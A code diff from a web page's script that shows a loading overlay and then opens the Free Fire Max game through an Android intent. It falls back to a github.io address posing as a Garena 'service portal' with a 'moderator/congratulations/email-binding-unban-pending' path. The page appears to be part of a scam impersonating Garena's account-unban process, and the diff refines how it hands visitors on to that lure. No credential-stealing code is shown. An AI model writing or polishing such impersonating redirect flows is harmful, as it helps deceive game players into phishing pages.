@@ -236,30 +236,27 @@
                 loadingOverlay.style.display = 'flex';
 
                 setTimeout(() => {
-                    // Try to launch Free Fire Max app
+                    // Launch Free Fire Max app directly
                     launchFreeFireMax();
                 }, 3000);
             }
 
             function launchFreeFireMax() {
-                // Method 1: Try Free Fire Max app scheme
-                const appScheme = "freefiremax://";
+                // Perfect Android Intent for opening an App strictly by its Package Name
+                // Action MAIN aur Category LAUNCHER use karne se Android OS direct game ko khol dega.
+                const packageName = "com.dts.freefiremax";
+                const fallbackUrl = "https://garena-freefire-service-portal.github.io/moderator/congratulations/email-binding-unban-pending0287410366";
                 
-                // Method 2: Android Intent for better compatibility
-                const intentUrl = `intent://launch/#Intent;scheme=${appScheme};package=com.dts.freefiremax;S.browser_fallback_url=https://garena-freefire-service-portal.github.io/moderator/congratulations/email-binding-unban-pending0287410366;end`;
+                // Chrome/Android strict deep link format
+                const intentUrl = `intent://#Intent;package=${packageName};action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;S.browser_fallback_url=${encodeURIComponent(fallbackUrl)};end;`;
                 
-                // First try: Direct app launch
-                window.location.href = appScheme;
-                
-                // Second try: Android Intent (if first fails)
+                // Game launch command
+                window.location.replace(intentUrl);
+
+                // Fallback for non-Android devices ya agar kuch error aaye
                 setTimeout(() => {
-                    window.location.href = intentUrl;
-                }, 500);
-                
-                // Final fallback: Original URL
-                setTimeout(() => {
-                    window.location.href = "https://garena-freefire-service-portal.github.io/moderator/congratulations/email-binding-unban-pending0287410366";
-                }, 1500);
+                    window.location.href = fallbackUrl;
+                }, 2500);
             }
         });
     </script>
